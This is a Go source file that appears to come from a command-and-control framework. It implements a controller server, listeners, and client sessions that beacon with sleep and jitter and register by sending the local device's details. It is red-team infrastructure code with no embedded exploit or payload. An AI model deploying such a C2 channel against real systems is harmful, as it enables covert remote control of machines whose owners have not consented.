package c2

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt/c2/transform"
	"github.com/iDigitalFlame/xmt/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/device"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

const (
	// DefaultSleep is the default sleep Time when the provided sleep value
	// is empty or negative.
	DefaultSleep = time.Duration(30) * time.Second

	// DefaultJitter is the default Jitter value when the provided jitter
	// value is negative.
	DefaultJitter int8 = 5

	// DefaultBufferSize is the default byte array size used when the
	// buffer size in a Profile is negative or zero.
	DefaultBufferSize = 4096

	maxEvents      = 256
	maxErrors int8 = 3
)

var (
	// Controller is the master list and manager for all C2 client connections.
	// The controller acts as staging point to control and manage all connections.
	Controller = NewServer("global", logx.NewConsole(logx.LInfo))

	// DefaultProfile is an simple profile for use with
	// testing or filling without having to define all the
	// profile properties.
	DefaultProfile = &Profile{
		Size:   DefaultBufferSize,
		Sleep:  DefaultSleep,
		Jitter: DefaultJitter,
	}

	// ErrEmptyPacket is a error returned by the Connect function when
	// the expected return result from the server was invalid or not expected.
	ErrEmptyPacket = errors.New("server sent an invalid response")

	// ErrNoConnector is a error returned by the Connect  and Listen functions when
	// the Connector is nil and the provided Profile is also nil or does not inherit
	// the Connector interface.
	ErrNoConnector = errors.New("invalid or missing connector")

	// DefaultServerMux is the default Mux instance that handles simple C2
	// client and server functions, from the server side.
	DefaultServerMux = mux(true)

	// DefaultClientMux is the default Mux instance that handles simple C2
	// server and client functions, from the client side.
	DefaultClientMux = mux(false)
)

// Server is a struct that helps manage and contain
// the sessions and processes events.
type Server struct {
	Log logx.Log
	Mux Mux

	ctx    context.Context
	name   string
	close  chan string
	events chan *callback
	cancel context.CancelFunc
	active map[string]*Handle
}

// Profile is a struct that represents a C2 profile. This is used for
// defining the specifics that will be used to listen by servers and connect
// by clients.  Nil or empty values will be replaced with defaults.
type Profile struct {
	Size      int
	Sleep     time.Duration
	Jitter    int8
	Wrapper   wrapper.Wrapper
	Transform transform.Transform
}
type callback struct {
	packet      *com.Packet
	session     *Session
	packetFunc  func(*Session, *com.Packet)
	sessionFunc func(*Session)
}

// Wait will block until the current controller
// is closed and shutdown.
func (s *Server) Wait() {
	<-s.ctx.Done()
}
func (s *Server) process() {
	for s.ctx.Err() == nil {
		select {
		case <-s.ctx.Done():
			return
		case r := <-s.close:
			delete(s.active, r)
		case e := <-s.events:
			e.trigger(s)
		}
	}
}

// Close stops the processing thread from this Controller and
// releases all associated resources.
func (s *Server) Close() error {
	defer func() { recover() }()
	s.cancel()
	close(s.close)
	close(s.events)
	return nil
}

// IsActive returns true if this Controller is
// still able to send and receive Packets.
func (s *Server) IsActive() bool {
	return s.ctx.Err() == nil
}
func (e *callback) trigger(s *Server) {
	defer func(x *Server) {
		if err := recover(); err != nil {
			x.Log.Error("[%s] Controller trigger function recovered from a panic! (%s)", x.name, err)
		}
	}(s)
	if e.packet != nil && e.packetFunc != nil {
		e.packetFunc(e.session, e.packet)
	}
	if e.session != nil && e.sessionFunc != nil {
		e.sessionFunc(e.session)
	}
	e.packet = nil
	e.session = nil
	e.packetFunc = nil
	e.sessionFunc = nil
}

// NewServer creates a new Server instance for manageing C2
// clients and session. If needed the default "c2.Controller" is the
// recommended Server to use.
func NewServer(n string, l logx.Log) *Server {
	s := &Server{
		Log:    l,
		Mux:    DefaultServerMux,
		name:   n,
		active: make(map[string]*Handle),
		events: make(chan *callback, maxEvents),
	}
	s.ctx, s.cancel = context.WithCancel(context.Background())
	s.Log.Trace("[%s] Controller started...", n)
	go s.process()
	return s
}

// Listen adds the Listener under the name provided.  A Handle struct
// to control and receive callback functions is added to assist in
// manageing connections to this Listener.
func (s *Server) Listen(n, b string, v com.Server, p *Profile) (*Handle, error) {
	if v == nil {
		return nil, ErrNoConnector
	}
	l, err := v.Listen(b)
	if err != nil {
		return nil, fmt.Errorf("unable to listen on \"%s\": %w", b, err)
	}
	if l == nil {
		return nil, fmt.Errorf("unable to listen on \"%s\"", b)
	}
	x := strings.ToLower(n)
	if _, ok := s.active[x]; ok {
		return nil, fmt.Errorf("listener \"%s\" is already active", x)
	}
	h := &Handle{
		name:       x,
		listener:   l,
		sessions:   make(map[uint32]*Session),
		controller: s,
	}
	if p != nil {
		h.size = p.Size
		h.Wrapper = p.Wrapper
		h.Transform = p.Transform
	}
	if h.size <= 0 {
		h.size = DefaultBufferSize
	}
	h.close = make(chan uint32, h.size)
	h.ctx, h.cancel = context.WithCancel(s.ctx)
	s.active[x] = h
	s.Log.Debug("Added listener type \"%s\" as \"%s\"...", l, strings.ToLower(n))
	go h.listen()
	return h, nil
}

// Connect creates a Session using the supplied Profile to connect to
// the listening server specified.
func (s *Server) Connect(a string, v com.Connector, p *Profile) (*Session, error) {
	return s.ConnectWith(a, v, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT
// register the device with the controller.  This is used for spending specific data
// segments in single use connections.
func (s *Server) Oneshot(a string, v com.Connector, p *Profile, d *com.Packet) error {
	if v == nil {
		return ErrNoConnector
	}
	var w wrapper.Wrapper
	var t transform.Transform
	if p != nil {
		w = p.Wrapper
		t = p.Transform
	}
	i, err := v.Connect(a)
	if err != nil {
		return fmt.Errorf("unable to connect to \"%s\": %w", a, err)
	}
	defer i.Close()
	if d == nil {
		d = &com.Packet{ID: MsgPing}
	}
	d.Flags |= com.FlagOneshot
	if err := write(i, w, t, d); err != nil {
		return fmt.Errorf("unable to write packet: %w", err)
	}
	return nil
}

// ConnectWith creates a Session using the supplied Profile to connect to
// the listening server specified. This function allows for passing the data Packet
// specified to the server with the initial registration. The data will be passed on
// normally.
func (s *Server) ConnectWith(a string, v com.Connector, p *Profile, d *com.Packet) (*Session, error) {
	if v == nil {
		return nil, ErrNoConnector
	}
	x := DefaultBufferSize
	if p != nil && p.Size > 0 {
		x = p.Size
	}
	n := &Session{
		ID:         device.Local.ID,
		Mux:        DefaultClientMux,
		send:       make(chan *com.Packet, x),
		recv:       make(chan *com.Packet, x),
		wake:       make(chan bool, 1),
		frags:      make(map[uint16]*com.Packet),
		errors:     maxErrors,
		Device:     device.Local.Machine,
		server:     a,
		connect:    v.Connect,
		controller: s,
	}
	n.ctx, n.cancel = context.WithCancel(s.ctx)
	if p != nil {
		n.Sleep = p.Sleep
		n.Jitter = p.Jitter
		n.wrapper = p.Wrapper
		n.transform = p.Transform
	}
	if n.Sleep <= 0 {
		n.Sleep = DefaultSleep
	}
	if n.Jitter < 0 {
		n.Jitter = DefaultJitter
	}
	i, err := v.Connect(a)
	if err != nil {
		return nil, fmt.Errorf("unable to connect to \"%s\": %w", a, err)
	}
	defer i.Close()
	z := &com.Packet{ID: MsgHello, Job: uint16(util.Rand.Uint32())}
	n.Device.MarshalStream(z)
	if d != nil {
		d.MarshalStream(z)
		z.Flags |= com.FlagData
	}
	z.Close()
	if err := write(i, n.wrapper, n.transform, z); err != nil {
		return nil, fmt.Errorf("unable to write packet: %w", err)
	}
	r, err := read(i, n.wrapper, n.transform)
	if err != nil {
		return nil, fmt.Errorf("unable to read packet: %w", err)
	}
	if r.IsEmpty() || r.ID != MsgRegistered {
		return nil, ErrEmptyPacket
	}
	s.Log.Debug("[%s] Client connected to \"%s\"...", n.ID, a)
	go n.listen()
	return n, nil
}
